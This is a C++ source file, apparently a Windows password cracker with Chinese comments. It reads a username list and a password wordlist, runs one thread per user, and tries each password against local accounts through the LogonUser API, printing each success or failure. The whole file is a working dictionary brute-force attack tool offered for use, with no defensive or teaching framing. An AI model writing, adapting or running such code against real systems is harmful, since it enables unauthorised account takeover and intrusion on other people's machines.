#include "cracker.h"
#include <windows.h>
#include <cstdio>
#include <deque>
#include <vector>
#include <string>
#include <iostream>
using namespace std;

struct _thread_param{
    int id;
    char user_name[64];
    CRITICAL_SECTION *critical_sec;
    deque <string> *queue;
};

FILE *users_file, *pwd_file;
int users_num;
vector <HANDLE> threads;            //存放线程句柄
vector <_thread_param> thread_info; //存放线程信息

//初始化
void init_cracker() {
    users_file = fopen(USERS_FILE, "r");    //用户名
    pwd_file = fopen(PWD_FILE,  "r");       //密码

    int queue_id = 0;
    unsigned long ID;
    struct _thread_param t_param;
    HANDLE t_handle, q_handle;  
    
    printf("[i]Create Threads");            //创建线程, 数量为用户名的个数
    while (EOF != fscanf(users_file, "%s", t_param.user_name)){
        //充填_thread_param结构体
        t_param.id = queue_id;
        t_param.queue = new deque <string>;
        t_param.critical_sec = new CRITICAL_SECTION;
        
        //初始化每个队列的临界区
        InitializeCriticalSection(t_param.critical_sec);

        thread_info.push_back(t_param);
        //启动线程
        t_handle = CreateThread(NULL, 0, _crack_pro, (LPVOID)&thread_info.back(), 0, &ID);
        threads.push_back(t_handle); //保存他的句柄
        putchar('.');
        Sleep(1000);
        ++queue_id;
    }
    putchar(0x0A);

    //启动维护密码队列的线程
    q_handle = CreateThread(NULL, 0, process_queue, (LPVOID)NULL, 0, &ID);

}

//释放相关资源
void free_cracker(){
    //关闭两个文件
    fclose(users_file);
    fclose(pwd_file);
    //释放一些内存以及临界区
    for (vector <_thread_param>::iterator i = thread_info.begin(); i != thread_info.end(); ++i){
        DeleteCriticalSection(i->critical_sec);
        delete i->critical_sec;
        delete i->queue;
    }
    //关闭线程句柄
    for (vector <HANDLE>::iterator i = threads.begin(); i != threads.end(); ++i){
        CloseHandle(*i);
    }

    printf("[i]Exit.\n");
}

void crack_pwd(){
    //将vector中的数据放到数组去
    HANDLE *thds = (HANDLE *)malloc(sizeof (HANDLE) * threads.size());
    int c = 0;
    for (vector <HANDLE>::iterator i = threads.begin(); i != threads.end(); ++i){
        thds[c] = *i;
        ++c;
    }
    putchar(0x0A);
    //等待所有线程返回
    WaitForMultipleObjects(threads.size(), thds, TRUE,  INFINITE);
    free(thds);
}


DWORD WINAPI process_queue(LPVOID param){    
    char buf[64];
    while (fgets(buf, 64, pwd_file)){   //不断读入密码,每行一个
        buf[strlen(buf) - 1] = 0;       //去掉那个换行符
        string tmp(buf);
        //将这个密码压入每个队列, 传输给对应的线程
        for (vector <_thread_param>::iterator i = thread_info.begin(); i != thread_info.end(); ++i){
            EnterCriticalSection(i->critical_sec);
            i->queue->push_back(tmp);   
            LeaveCriticalSection(i->critical_sec);
        }
    }
    //没有密码了, 将结束标识压入队列
    for (vector <_thread_param>::iterator i = thread_info.begin(); i != thread_info.end(); ++i){
        EnterCriticalSection(i->critical_sec);
        i->queue->push_back("{$END_LABLE$}"); 
        LeaveCriticalSection(i->critical_sec);
    }
    return 0;
}

//破解函数
DWORD WINAPI _crack_pro(LPVOID param){
	HANDLE token;
    struct _thread_param t_param;
    char pwd[64] = {0};
    string buf;
    memcpy(&t_param, param, sizeof (struct _thread_param));

    while (1){
        //读取队列中的数据
        EnterCriticalSection(t_param.critical_sec);
        if (0 == t_param.queue->size()){ //队列为空就sleep一下
            LeaveCriticalSection(t_param.critical_sec);
            Sleep(200);
            continue;
        }
        buf = t_param.queue->front();
        t_param.queue->pop_front();
        LeaveCriticalSection(t_param.critical_sec);

        if (buf == "{$END_LABLE$}"){ //接受到结束标识就退出线程
            printf("[t]thread %d receives a END msg, EXIT thread.\n", t_param.id);
            break;
        }
        //copy密码到pwd, 准备破解
        strcpy(pwd, buf.c_str());
        //使用LogonUser函数测试密码
		int ret = LogonUser(
			t_param.user_name,		// string that specifies the user name
			".",		        	/* string that specifies the domain or server,"." maen
								    it is a Local Mechin*/
			pwd,			        // string that specifies the password
			LOGON32_LOGON_INTERACTIVE,	/* This logon type is intended for users who 
											will be interactively using the machine, 
											such as a user being logged on by a terminal
											 server, remote shell, or similar process. 
											 This logon type has the additional expense 
											 of caching logon information for 
											 disconnected operation, and is therefore 
											 inappropriate for some client/server 
											 applications, such as a mail server.*/
			LOGON32_PROVIDER_DEFAULT,	// specifies the logon provider
			&token				// pointer to variable to receive token handle
			);
        
		if (ret == TRUE){ //返回登录成功, 输出
			printf("[i]try %16s on %16s   success!\n", pwd, t_param.user_name);
            printf("[t]thread %d has got a password for <%s>, EXIT thread.\n", t_param.id, t_param.user_name);
			break;
		}else{            //返回登录失败, 也输出
			printf("[i]try %16s on %16s   fail!\n", pwd, t_param.user_name);
        }
		CloseHandle(token);
    }
}


